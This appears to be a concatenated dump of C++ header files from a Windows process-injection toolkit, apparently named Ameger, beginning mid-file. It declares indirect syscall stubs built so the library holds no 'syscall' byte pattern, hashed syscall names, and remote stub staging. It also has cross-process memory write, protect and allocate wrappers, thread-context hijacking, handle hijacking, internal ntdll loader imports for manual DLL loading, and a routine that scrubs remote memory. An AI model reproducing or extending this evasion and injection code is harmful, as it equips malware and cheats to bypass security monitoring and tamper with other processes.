static_assert(sizeof(LDR_DATA_TABLE_ENTRY_WIN11) == 312);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, DllBase) == 48);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, SizeOfImage) == 64);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, FullDllName) == 72);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, DdagNode) == 152);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, OriginalBase) == 248);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, CheckSum) == 288);
static_assert(offsetof(LDR_DATA_TABLE_ENTRY_WIN11, HotPatchState) == 304);

```

### Ameger/Native/Syscall.h â€” 503 lines â€” sha12:49D3A696DDFB
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#include "NT/Windows11.h"

constexpr DWORD ScHash(const char * s)
{
	DWORD h = 0x811C9DC5u;
	while (*s)
	{
		h ^= static_cast<BYTE>(*s++);
		h *= 0x01000193u;
	}
	return h;
}

#define SC_NAME(f) ScHash(#f)

#pragma region syscall ids

#define SC_NtOpenProcess					SC_NAME(NtOpenProcess)
#define SC_NtOpenThread						SC_NAME(NtOpenThread)
#define SC_NtDuplicateObject				SC_NAME(NtDuplicateObject)

#define SC_NtQuerySystemInformation			SC_NAME(NtQuerySystemInformation)
#define SC_NtQueryInformationProcess		SC_NAME(NtQueryInformationProcess)
#define SC_NtQueryInformationThread			SC_NAME(NtQueryInformationThread)

#define SC_NtAllocateVirtualMemory			SC_NAME(NtAllocateVirtualMemory)
#define SC_NtFreeVirtualMemory				SC_NAME(NtFreeVirtualMemory)
#define SC_NtProtectVirtualMemory			SC_NAME(NtProtectVirtualMemory)
#define SC_NtWriteVirtualMemory				SC_NAME(NtWriteVirtualMemory)
#define SC_NtReadVirtualMemory				SC_NAME(NtReadVirtualMemory)

#define SC_NtSuspendThread					SC_NAME(NtSuspendThread)
#define SC_NtResumeThread					SC_NAME(NtResumeThread)
#define SC_NtGetContextThread				SC_NAME(NtGetContextThread)
#define SC_NtSetContextThread				SC_NAME(NtSetContextThread)

#pragma endregion

#pragma region stub layout

#define SC_STUB_SIZE			16
#define SC_STUB_AREA_ALIGN		0x10

#define SC_STUB_OFFSET_PROLOGUE	0
#define SC_STUB_OFFSET_OPCODE		3
#define SC_STUB_OFFSET_SERVICE		4
#define SC_STUB_OFFSET_SYSCALL		8
#define SC_STUB_TAIL_INDIRECT	14

#pragma endregion

#define SC_REMOTE_STUB_COUNT		4

void *	SyscallStub(DWORD NameHash);

DWORD	SyscallResolveAll();

DWORD	SyscallServiceOfStub(const void * Stub);

// Address of the `syscall ; ret` gadget inside ntdll that every indirect stub jumps
// through. The gadget lives in a legitimate system module, so no `0F 05` byte
// pattern ever has to exist in memory this library owns.
void *	SyscallGadgetAddress();

// Builds `Count` syscall stubs for `NameHashes` into `Destination`.
//
// The stubs are emitted in the indirect form: each one jumps through the ntdll
// gadget slot that is appended after the stub array, so the destination buffer
// never contains a `syscall` instruction.
//
// `RemoteBase` is the address the buffer will occupy in the target process. The
// RIP-relative jump displacements are computed against that address, not against
// this process's copy of the buffer, so a stub that is staged remotely lands with
// a correct displacement. Pass 0 when the buffer stays in this process.
//
// `DestinationSize` must cover the stub array *and* the trailing 8-byte gadget
// slot (use `SC_REMOTE_STUB_COUNT * SC_STUB_SIZE + sizeof(void *)`).
DWORD	BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD * NameHashes, DWORD Count, ULONG_PTR RemoteBase = 0);

#pragma region typed wrappers

using f_ScNtOpenProcess = NTSTATUS(NTAPI *)(
	PHANDLE				ProcessHandle,
	ACCESS_MASK			DesiredAccess,
	OBJECT_ATTRIBUTES * ObjectAttributes,
	CLIENT_ID *			ClientId
	);

using f_ScNtOpenThread = NTSTATUS(NTAPI *)(
	PHANDLE				ThreadHandle,
	ACCESS_MASK			DesiredAccess,
	OBJECT_ATTRIBUTES * ObjectAttributes,
	CLIENT_ID *			ClientId
	);

using f_ScNtDuplicateObject = NTSTATUS(NTAPI *)(
	HANDLE		SourceProcessHandle,
	HANDLE		SourceHandle,
	HANDLE		TargetProcessHandle,
	PHANDLE		TargetHandle,
	ACCESS_MASK	DesiredAccess,
	ULONG		HandleAttributes,
	ULONG		Options
	);

using f_ScNtQueryInformationProcess = NTSTATUS(NTAPI *)(
	HANDLE			ProcessHandle,
	PROCESSINFOCLASS	ProcessInformationClass,
	void *			ProcessInformation,
	ULONG			ProcessInformationLength,
	ULONG *			ReturnLength
	);

using f_ScNtQueryInformationThread = NTSTATUS(NTAPI *)(
	HANDLE			ThreadHandle,
	THREADINFOCLASS	ThreadInformationClass,
	void *			ThreadInformation,
	ULONG			ThreadInformationLength,
	ULONG *			ReturnLength
	);

using f_ScNtAllocateVirtualMemory = NTSTATUS(NTAPI *)(
	HANDLE		ProcessHandle,
	PVOID *		BaseAddress,
	ULONG_PTR	ZeroBits,
	SIZE_T *	RegionSize,
	ULONG		AllocationType,
	ULONG		Protect
	);

using f_ScNtFreeVirtualMemory = NTSTATUS(NTAPI *)(
	HANDLE	ProcessHandle,
	PVOID *	BaseAddress,
	SIZE_T *RegionSize,
	ULONG	FreeType
	);

using f_ScNtProtectVirtualMemory = NTSTATUS(NTAPI *)(
	HANDLE		ProcessHandle,
	PVOID *		BaseAddress,
	SIZE_T *	NumberOfBytesToProtect,
	ULONG		NewAccessProtection,
	ULONG *		OldAccessProtection
	);

using f_ScNtWriteVirtualMemory = NTSTATUS(NTAPI *)(
	HANDLE	ProcessHandle,
	PVOID	BaseAddress,
	void *	Buffer,
	SIZE_T	NumberOfBytesToWrite,
	SIZE_T *NumberOfBytesWritten
	);

using f_ScNtReadVirtualMemory = NTSTATUS(NTAPI *)(
	HANDLE	ProcessHandle,
	PVOID	BaseAddress,
	void *	Buffer,
	SIZE_T	NumberOfBytesToRead,
	SIZE_T *NumberOfBytesRead
	);

using f_ScNtSuspendThread = NTSTATUS(NTAPI *)(
	HANDLE		ThreadHandle,
	ULONG *		PreviousSuspendCount
	);

using f_ScNtResumeThread = NTSTATUS(NTAPI *)(
	HANDLE		ThreadHandle,
	ULONG *		SuspendCount
	);

using f_ScNtGetContextThread = NTSTATUS(NTAPI *)(
	HANDLE	ThreadHandle,
	CONTEXT *Context
	);

using f_ScNtSetContextThread = NTSTATUS(NTAPI *)(
	HANDLE	ThreadHandle,
	CONTEXT *Context
	);

#pragma endregion

#pragma region direct wrappers

__forceinline ULONG * ScOut(ULONG * Requested, ULONG & Scratch)
{
	if (Requested)
	{
		return Requested;
	}

	Scratch = 0;

	return &Scratch;
}

__forceinline SIZE_T * ScOut(SIZE_T * Requested, SIZE_T & Scratch)
{
	if (Requested)
	{
		return Requested;
	}

	Scratch = 0;

	return &Scratch;
}

__forceinline NTSTATUS ScNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES * ObjectAttributes, CLIENT_ID * ClientId)
{
	auto Stub = ReCa<f_ScNtOpenProcess>(SyscallStub(SC_NtOpenProcess));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

__forceinline NTSTATUS ScNtOpenThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES * ObjectAttributes, CLIENT_ID * ClientId)
{
	auto Stub = ReCa<f_ScNtOpenThread>(SyscallStub(SC_NtOpenThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId);
}

__forceinline NTSTATUS ScNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options)
{
	auto Stub = ReCa<f_ScNtDuplicateObject>(SyscallStub(SC_NtDuplicateObject));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(SourceProcessHandle, SourceHandle, TargetProcessHandle, TargetHandle, DesiredAccess, HandleAttributes, Options);
}

__forceinline NTSTATUS ScNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, void * ProcessInformation, ULONG ProcessInformationLength, ULONG * ReturnLength)
{
	auto Stub = ReCa<f_ScNtQueryInformationProcess>(SyscallStub(SC_NtQueryInformationProcess));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	ULONG scratch = 0;

	return Stub(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ScOut(ReturnLength, scratch));
}

__forceinline NTSTATUS ScNtQueryInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, void * ThreadInformation, ULONG ThreadInformationLength, ULONG * ReturnLength)
{
	auto Stub = ReCa<f_ScNtQueryInformationThread>(SyscallStub(SC_NtQueryInformationThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	ULONG scratch = 0;

	return Stub(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength, ScOut(ReturnLength, scratch));
}

__forceinline NTSTATUS ScNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, ULONG_PTR ZeroBits, SIZE_T * RegionSize, ULONG AllocationType, ULONG Protect)
{
	auto Stub = ReCa<f_ScNtAllocateVirtualMemory>(SyscallStub(SC_NtAllocateVirtualMemory));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

__forceinline NTSTATUS ScNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, SIZE_T * RegionSize, ULONG FreeType)
{
	auto Stub = ReCa<f_ScNtFreeVirtualMemory>(SyscallStub(SC_NtFreeVirtualMemory));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

__forceinline NTSTATUS ScNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, SIZE_T * NumberOfBytesToProtect, ULONG NewAccessProtection, ULONG * OldAccessProtection)
{
	auto Stub = ReCa<f_ScNtProtectVirtualMemory>(SyscallStub(SC_NtProtectVirtualMemory));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	ULONG scratch = 0;

	return Stub(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, ScOut(OldAccessProtection, scratch));
}

__forceinline NTSTATUS ScNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, void * Buffer, SIZE_T NumberOfBytesToWrite, SIZE_T * NumberOfBytesWritten)
{
	auto Stub = ReCa<f_ScNtWriteVirtualMemory>(SyscallStub(SC_NtWriteVirtualMemory));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	SIZE_T scratch = 0;

	return Stub(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, ScOut(NumberOfBytesWritten, scratch));
}

__forceinline NTSTATUS ScNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, void * Buffer, SIZE_T NumberOfBytesToRead, SIZE_T * NumberOfBytesRead)
{
	auto Stub = ReCa<f_ScNtReadVirtualMemory>(SyscallStub(SC_NtReadVirtualMemory));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	SIZE_T scratch = 0;

	return Stub(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, ScOut(NumberOfBytesRead, scratch));
}

__forceinline NTSTATUS ScNtSuspendThread(HANDLE ThreadHandle, ULONG * PreviousSuspendCount)
{
	auto Stub = ReCa<f_ScNtSuspendThread>(SyscallStub(SC_NtSuspendThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	ULONG scratch = 0;

	return Stub(ThreadHandle, ScOut(PreviousSuspendCount, scratch));
}

__forceinline NTSTATUS ScNtResumeThread(HANDLE ThreadHandle, ULONG * SuspendCount)
{
	auto Stub = ReCa<f_ScNtResumeThread>(SyscallStub(SC_NtResumeThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	ULONG scratch = 0;

	return Stub(ThreadHandle, ScOut(SuspendCount, scratch));
}

__forceinline NTSTATUS ScNtGetContextThread(HANDLE ThreadHandle, CONTEXT * Context)
{
	auto Stub = ReCa<f_ScNtGetContextThread>(SyscallStub(SC_NtGetContextThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ThreadHandle, Context);
}

__forceinline NTSTATUS ScNtSetContextThread(HANDLE ThreadHandle, CONTEXT * Context)
{
	auto Stub = ReCa<f_ScNtSetContextThread>(SyscallStub(SC_NtSetContextThread));
	if (!Stub)
	{
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	return Stub(ThreadHandle, Context);
}

#pragma endregion

#pragma region convenience helpers

__forceinline HANDLE ScOpenProcess(DWORD ProcessId, ACCESS_MASK DesiredAccess)
{
	if (!ProcessId)
	{
		return nullptr;
	}

	CLIENT_ID ClientId{ };
	ClientId.UniqueProcess = ReCa<HANDLE>(static_cast<ULONG_PTR>(ProcessId));

	OBJECT_ATTRIBUTES Attributes{ };
	Attributes.Length = sizeof(OBJECT_ATTRIBUTES);

	HANDLE Handle = nullptr;
	if (NT_FAIL(ScNtOpenProcess(&Handle, DesiredAccess, &Attributes, &ClientId)))
	{
		return nullptr;
	}

	return Handle;
}

__forceinline HANDLE ScOpenThread(DWORD ThreadId, ACCESS_MASK DesiredAccess)
{
	if (!ThreadId)
	{
		return nullptr;
	}

	CLIENT_ID ClientId{ };
	ClientId.UniqueThread = ReCa<HANDLE>(static_cast<ULONG_PTR>(ThreadId));

	OBJECT_ATTRIBUTES Attributes{ };
	Attributes.Length = sizeof(OBJECT_ATTRIBUTES);

	HANDLE Handle = nullptr;
	if (NT_FAIL(ScNtOpenThread(&Handle, DesiredAccess, &Attributes, &ClientId)))
	{
		return nullptr;
	}

	return Handle;
}

__forceinline bool ScWriteProcessMemory(HANDLE ProcessHandle, void * BaseAddress, const void * Buffer, SIZE_T Size, SIZE_T * Written = nullptr)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !BaseAddress || !Buffer || !Size)
	{
		return false;
	}

	const NTSTATUS Status = ScNtWriteVirtualMemory(ProcessHandle, BaseAddress, const_cast<void *>(Buffer), Size, Written);
	return NT_SUCCESS(Status);
}

__forceinline bool ScReadProcessMemory(HANDLE ProcessHandle, const void * BaseAddress, void * Buffer, SIZE_T Size, SIZE_T * Read = nullptr)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !BaseAddress || !Buffer || !Size)
	{
		return false;
	}

	const NTSTATUS Status = ScNtReadVirtualMemory(ProcessHandle, const_cast<void *>(BaseAddress), Buffer, Size, Read);
	return NT_SUCCESS(Status);
}

__forceinline void * ScAllocateMemory(HANDLE ProcessHandle, SIZE_T Size, ULONG Protect)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !Size)
	{
		return nullptr;
	}

	void * Base = nullptr;
	SIZE_T Region = Size;
	const NTSTATUS Status = ScNtAllocateVirtualMemory(ProcessHandle, &Base, 0, &Region, MEM_COMMIT | MEM_RESERVE, Protect);

	if (NT_FAIL(Status) || !Base)
	{
		return nullptr;
	}

	return Base;
}

__forceinline NTSTATUS ScProtectMemoryStatus(HANDLE ProcessHandle, void * BaseAddress, SIZE_T Size, ULONG NewProtect, ULONG * OldProtect = nullptr, SIZE_T * RegionOut = nullptr)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !BaseAddress || !Size)
	{
		return STATUS_INVALID_PARAMETER;
	}

	void * Base = BaseAddress;
	SIZE_T Region = Size;
	const NTSTATUS Status = ScNtProtectVirtualMemory(ProcessHandle, &Base, &Region, NewProtect, OldProtect);

	if (RegionOut)
	{
		*RegionOut = Region;
	}

	return Status;
}

__forceinline bool ScProtectMemory(HANDLE ProcessHandle, void * BaseAddress, SIZE_T Size, ULONG NewProtect, ULONG * OldProtect = nullptr)
{
	return NT_SUCCESS(ScProtectMemoryStatus(ProcessHandle, BaseAddress, Size, NewProtect, OldProtect));
}

__forceinline bool ScFreeMemory(HANDLE ProcessHandle, void * BaseAddress)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !BaseAddress)
	{
		return false;
	}

	void * Base = BaseAddress;
	SIZE_T Region = 0;
	const NTSTATUS Status = ScNtFreeVirtualMemory(ProcessHandle, &Base, &Region, MEM_RELEASE);

	return NT_SUCCESS(Status);
}

__forceinline void ScrubRemoteRegion(HANDLE ProcessHandle, void * BaseAddress, SIZE_T Size, SIZE_T ChunkSize)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE || !BaseAddress || !Size || !ChunkSize)
	{
		return;
	}

	const SIZE_T Chunk = Size < ChunkSize ? Size : ChunkSize;
	BYTE * Zeros = ReCa<BYTE *>(VirtualAlloc(nullptr, Chunk, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!Zeros)
	{
		return;
	}

	SYSTEM_INFO system_info{};
	GetSystemInfo(&system_info);
	const SIZE_T page = system_info.dwPageSize ? system_info.dwPageSize : 0x1000;

	BYTE * Cursor = ReCa<BYTE *>(BaseAddress);
	SIZE_T Remaining = Size;
	while (Remaining)
	{
		const SIZE_T page_remainder = page - (ReCa<ULONG_PTR>(Cursor) & (page - 1));
		const SIZE_T span = Remaining < page_remainder ? Remaining : page_remainder;

		ULONG old_protect = 0;
		if (!ScProtectMemory(ProcessHandle, Cursor, span, PAGE_READWRITE, &old_protect))
		{
			break;
		}

		SIZE_T written = 0;
		while (written < span)
		{
			const SIZE_T this_chunk = (span - written) < Chunk ? (span - written) : Chunk;
			if (!ScWriteProcessMemory(ProcessHandle, Cursor + written, Zeros, this_chunk, nullptr))
			{
				break;
			}

			written += this_chunk;
		}

		ScProtectMemory(ProcessHandle, Cursor, span, old_protect);

		if (written < span)
		{
			break;
		}

		Cursor += span;
		Remaining -= span;
	}

	VirtualFree(Zeros, 0, MEM_RELEASE);
}

__forceinline DWORD ScGetProcessId(HANDLE ProcessHandle)
{
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESS_BASIC_INFORMATION Basic{ };
	if (NT_FAIL(ScNtQueryInformationProcess(ProcessHandle, PROCESSINFOCLASS::ProcessBasicInformation, &Basic, sizeof(Basic), nullptr)))
	{
		return 0;
	}

	return static_cast<DWORD>(ReCa<ULONG_PTR>(Basic.UniqueProcessId) & 0xFFFFFFFF);
}

__forceinline DWORD ScGetThreadId(HANDLE ThreadHandle)
{
	if (!ThreadHandle || ThreadHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	THREAD_BASIC_INFORMATION Basic{ };
	if (NT_FAIL(ScNtQueryInformationThread(ThreadHandle, THREADINFOCLASS::ThreadBasicInformation, &Basic, sizeof(Basic), nullptr)))
	{
		return 0;
	}

	return static_cast<DWORD>(ReCa<ULONG_PTR>(Basic.ClientId.UniqueThread) & 0xFFFFFFFF);
}

__forceinline DWORD ScGetProcessIdOfThread(HANDLE ThreadHandle)
{
	if (!ThreadHandle || ThreadHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	THREAD_BASIC_INFORMATION Basic{ };
	if (NT_FAIL(ScNtQueryInformationThread(ThreadHandle, THREADINFOCLASS::ThreadBasicInformation, &Basic, sizeof(Basic), nullptr)))
	{
		return 0;
	}

	return static_cast<DWORD>(ReCa<ULONG_PTR>(Basic.ClientId.UniqueProcess) & 0xFFFFFFFF);
}

DWORD ScGetProcessImageName(HANDLE ProcessHandle, wchar_t * Buffer, DWORD Characters);

__forceinline bool ScGetExitCodeProcess(HANDLE ProcessHandle, DWORD & ExitCode)
{
	ExitCode = 0;

	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	PROCESS_BASIC_INFORMATION Basic{ };
	if (NT_FAIL(ScNtQueryInformationProcess(ProcessHandle, PROCESSINFOCLASS::ProcessBasicInformation, &Basic, sizeof(Basic), nullptr)))
	{
		return false;
	}

	ExitCode = Basic.ExitStatus;

	return true;
}

#pragma endregion

```

### Ameger/System/Download/Manager.h â€” 24 lines â€” sha12:200BAFD572B6
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

class Manager
{

    std::atomic<ULONGLONG>  m_ullDeadline{0};
    std::atomic<DWORD>      m_dwTimeoutMs{0};
    std::atomic<bool>       m_bTimedOut{false};
    std::atomic<bool>       m_bWatchdogStop{false};
    HANDLE                  m_hWatchdog = nullptr;
    HANDLE                  m_hWatchdogWake = nullptr;

    bool StartWatchdog();
    void StopWatchdog();
    void WatchdogProc();

    friend unsigned __stdcall DownloadWatchdogEntry(void * param);

public:

    Manager();

    ~Manager();

    Manager(const Manager &) = delete;
    Manager & operator=(const Manager &) = delete;

    bool SetTimeout(DWORD milliseconds);
    void StopTimeout();
    bool TimedOut() const;

    void TouchDeadline();
};

```

### Ameger/System/Handle/HandleHijack.h â€” 10 lines â€” sha12:8EC923F98ABD
```c-header
#pragma once

#include <Windows.h>

#include "Core/Foundation/Error.h"
#include "Core/Foundation/Primitives/InjectionTypes.h"

DWORD HijackProcessHandle(DWORD TargetPid, DWORD DesiredAccess, HANDLE & OutHandle, HijackStats * Detail = nullptr, HANDLE TargetOwnerHandle = nullptr);

DWORD HijackThreadHandle(DWORD TargetPid, DWORD TargetTid, DWORD DesiredAccess, HANDLE & OutHandle, HijackStats * Detail = nullptr, HANDLE TargetOwnerHandle = nullptr);

bool ValidateProcessDonorHandle(HANDLE Candidate, DWORD TargetPid, DWORD DesiredAccess);

bool ProbeMemoryRoundtrip(HANDLE Candidate);

void RecordHijackOutcome(const HijackStats & Stats, bool IsThread);

void __stdcall GetLastHijackStats(HijackStats * ProcessOut, HijackStats * ThreadOut);

```

### Ameger/System/Import/ImportHandler.h â€” 51 lines â€” sha12:B2359F7B1E10
```c-header
#pragma once

#include "NT/NTFunctions.h"
#include "System/Symbol/Parser/SymbolParser.h"
#include "Core/Utility/Tools/Tools.h"

inline HANDLE g_hRunningEvent		= nullptr;
inline volatile LONG g_InjectionGate	= 0;
inline HANDLE g_hInterruptEvent		= nullptr;
inline HANDLE g_hInterruptedEvent	= nullptr;
inline HANDLE g_hInterruptImport	= nullptr;

inline ERROR_DATA					import_handler_error_data;
inline ASYNC_WORKER_SLOT			import_handler_ret;

#define NT_FUNC(func) inline f_##func func = nullptr
#define NT_FUNC_LOCAL(func) f_##func func
#define NT_FUNC_CONSTRUCTOR_INIT(func) this->func = NATIVE::func

namespace NATIVE
{
	// A10: ntdll exports, resolved by name rather than through the PDB.
	NT_FUNC(TlsAlloc);
	NT_FUNC(TlsSetValue);
	NT_FUNC(TlsFree);

	NT_FUNC(LdrUnloadDll);

	NT_FUNC(LdrpLoadDllInternal);

	NT_FUNC(LdrGetProcedureAddress);

	NT_FUNC(LdrpPreprocessDllName);
	NT_FUNC(RtlInsertInvertedFunctionTable);
	NT_FUNC(RtlLookupFunctionEntry);
	NT_FUNC(LdrpHandleTlsData);

	NT_FUNC(LdrLockLoaderLock);
	NT_FUNC(LdrUnlockLoaderLock);

	NT_FUNC(LdrpDereferenceModule);

	NT_FUNC(memmove);
	NT_FUNC(RtlZeroMemory);
	NT_FUNC(RtlAllocateHeap);
	NT_FUNC(RtlFreeHeap);

	NT_FUNC(RtlAnsiStringToUnicodeString);

	NT_FUNC(NtAllocateVirtualMemory);
	NT_FUNC(NtFreeVirtualMemory);
	NT_FUNC(NtProtectVirtualMemory);
	NT_FUNC(NtSetEvent);
	NT_FUNC(NtClose);

	NT_FUNC(LdrProtectMrdata);

	NT_FUNC(LdrpHeap);
	NT_FUNC(LdrpInvertedFunctionTable);
	NT_FUNC(LdrpTlsList);

	NT_FUNC(RtlAddFunctionTable);

	NT_FUNC(RtlDeleteFunctionTable);

	NT_FUNC(RtlAddVectoredExceptionHandler);
	NT_FUNC(RtlRemoveVectoredExceptionHandler);
}

DWORD ResolveImports(ERROR_DATA & error_data);

void __stdcall GetLastStringStats(STRING_STATS * Out);

```

### Ameger/System/Information/ProcessInformation.h â€” 32 lines â€” sha12:C38827ABFAEB
```c-header
#pragma once

#include "System/Import/ImportHandler.h"
#include "System/Symbol/Offsets/DynamicOffsets.h"

class ProcessInformation
{
	SYSTEM_PROCESS_INFORMATION	* m_pCurrentProcess = nullptr;
	SYSTEM_PROCESS_INFORMATION	* m_pFirstProcess	= nullptr;
	SYSTEM_THREAD_INFORMATION	* m_pCurrentThread	= nullptr;

	ULONG m_BufferSize = 0;

	HANDLE m_hCurrentProcess = nullptr;
	bool m_ProcessLocated = false;

	DWORD m_CurrentThreadIndex = 0;

	f_NtQueryInformationProcess m_pNtQueryInformationProcess	= nullptr;
	f_NtQuerySystemInformation	m_pNtQuerySystemInformation		= nullptr;
	f_NtQueryInformationThread	m_pNtQueryInformationThread		= nullptr;

	HANDLE m_hCurrentThreadHandle = nullptr;
	DWORD m_CurrentThreadHandleTid = 0;

	HANDLE BorrowCurrentThreadHandle(DWORD tid) const;

	ProcessInformation(const ProcessInformation &) = delete;
	ProcessInformation & operator=(const ProcessInformation &) = delete;

public:

	ProcessInformation();
	~ProcessInformation();

	void SetCurrentThreadHandle(HANDLE thread, DWORD tid);

	bool SetProcess(HANDLE hTargetProc);

	bool NextThread();

	bool RefreshInformation();

	DWORD GetThreadId();

	bool GetThreadState(KTHREAD_STATE & state, KWAIT_REASON & reason);

	void * GetTEB();

	bool IsThreadWorkerThread();
};

```

### Ameger/System/Symbol/Loader/SymbolLoader.h â€” 70 lines â€” sha12:D88F1463A4A8
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#include "Core/Foundation/Error.h"
#include "System/Download/Manager.h"
#include "Core/Utility/Tools/Tools.h"

class SYMBOL_LOADER
{
	HANDLE			m_hPdbFile		= NULL;
	std::wstring	m_szPdbPath		= std::wstring();
	DWORD			m_Filesize		= 0;

	HANDLE				m_hInterruptEvent = NULL;
	std::atomic<bool>	m_bInterruptEvent{false};

	Manager m_DlMgr;
	std::atomic<bool>	m_bStartDownload{false};

	bool m_bReady = false;

	std::wstring	m_szPdbDir		= std::wstring();
	bool			m_bCreatedPdbDir = false;

	std::wstring	m_szRootPath	= std::wstring();

	bool VerifyExistingPdb(const GUID & guid, DWORD age);

	SYMBOL_LOADER(const SYMBOL_LOADER &) = delete;
	SYMBOL_LOADER & operator=(const SYMBOL_LOADER &) = delete;

public:

	SYMBOL_LOADER();
	~SYMBOL_LOADER();

	DWORD Initialize(const std::wstring & szModulePath, const std::wstring & path, bool Redownload, bool AutoDownload = false);

	void Cleanup();

	void PurgePdb();

	void SetDownload(bool bDownload);
	void Interrupt();

	const std::wstring &	GetFilepath() const;
	DWORD					GetFilesize() const;

	bool IsReady() const;
};

struct PdbInformation
{
	DWORD	Signature;
	GUID	Guid;
	DWORD	Age;
	char	PdbFileName[1];
};

struct PDBHeader7
{
	char signature[0x20];
	int page_size;
	int allocation_table_pointer;
	int file_page_count;
	int root_stream_size;
	int reserved;
	int root_stream_page_number_list_number;
};

struct RootStream7
{
	int num_streams;
	int stream_sizes[ANYSIZE_ARRAY];
};

struct GUID_StreamData
{
	int ver;
	int date;
	int age;
	GUID guid;
};

struct DBIStreamHeader
{
	int		version_signature;
	int		version_header;
	DWORD	age;
};

inline SYMBOL_LOADER				sym_ntdll_native;
inline ASYNC_WORKER_SLOT			sym_ntdll_native_ret;

```

### Ameger/System/Symbol/Offsets/DynamicOffsets.h â€” 38 lines â€” sha12:ADCBAB471DE9
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

struct DYNAMIC_NT_OFFSETS
{
	DWORD TebSameTebFlags = 0;
	DWORD TebLastErrorValue = 0;
	// A1: the current thread's 64 TLS slot pointers, and the PEB's inline
	// 64-bit TLS bitmap. LdrpHandleTlsData sets one bit and one slot; without
	// these the registration cannot be undone after a callbacks-only TLS block
	// has been processed.
	DWORD TebTlsSlots = 0;
	DWORD PebTlsBitmapBits = 0;

	DWORD PebLdr = 0;

	DWORD KuserCookie = 0;

	DWORD LdrEntryDllBase = 0;
	DWORD LdrEntrySize = 0;
	DWORD LdrEntrySizeOfImage = 0;
	DWORD LdrEntryFullDllName = 0;
	DWORD LdrEntryBaseDllName = 0;
	DWORD LdrEntryDdagNode = 0;
	DWORD LdrDdagNodeState = 0;
	DWORD LdrDdagNodeSize = 0;

	DWORD InvertedTableCount = 0;
	DWORD InvertedTableEntries = 0;
	DWORD InvertedEntryImageBase = 0;
	DWORD InvertedEntryExceptionDirectory = 0;
	DWORD InvertedEntryExceptionDirectorySize = 0;
	DWORD InvertedEntrySize = 0;

	DWORD TlsEntryModuleEntry = 0;
	DWORD TlsEntrySize = 0;

	DWORD SameTebFlagsLoaderWorkerMask = 0x2000;
	DWORD ThreadStateRunning = 2;

	DWORD LdrpPathSearchContextSize = 0;
	DWORD LdrpPathSearchOriginalFullDllName = 0;
};

inline DYNAMIC_NT_OFFSETS g_DynamicOffsets{};

inline std::atomic<DWORD> g_DynamicOffsetsReady{ 0 };

DWORD ResolveDynamicOffsets();

```

